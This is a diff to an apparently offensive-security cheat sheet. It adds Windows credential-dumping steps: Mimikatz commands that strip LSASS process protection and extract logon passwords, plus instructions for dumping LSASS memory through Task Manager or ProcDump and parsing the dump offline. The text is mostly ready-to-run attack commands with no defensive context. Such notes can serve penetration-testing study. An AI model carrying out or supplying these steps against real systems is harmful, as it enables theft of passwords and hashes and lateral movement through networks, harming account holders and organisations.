@@ -130,5 +130,26 @@ Check if PPL is running with powershell
 
 1) !+
 2) !processprotect /process:lsass.exe /remove
-3) sekurlsa::logonpasswords 
+3) sekurlsa::logonpasswords
+
+
+<br><br>
+
+IF GUI ACCESS:
+
+### Memory Dump from Task Manager
+
+>When opening a dump file in Mimikatz, the target machine and the processing machine must have a matching OS and architecture. For example, if the dumped LSASS process was from a Windows 10 64-bit machine; we must also parse it on a Windows 10 or Windows 2016/2019 64-bit machine. However, processing the dump file requires neither an elevated command prompt nor privilege::debug.
+
+1) TaskManager -> Create Dump File
+2) Move dump file to Mimikatz host.
+3) Load LSASS dump into Mimikatz memory: sekurlsa::minidump lsass.dmp
+4) sekurlsa::logonpasswords
+
+NO GUI ACCESS:
+
+**Alternatively, we can create the dump file from the command line with ProcDump from SysInternals.**
+
+Custom dump memory lsass file:
+procdump -ma lsass.exe lsass_dump.dmp
 
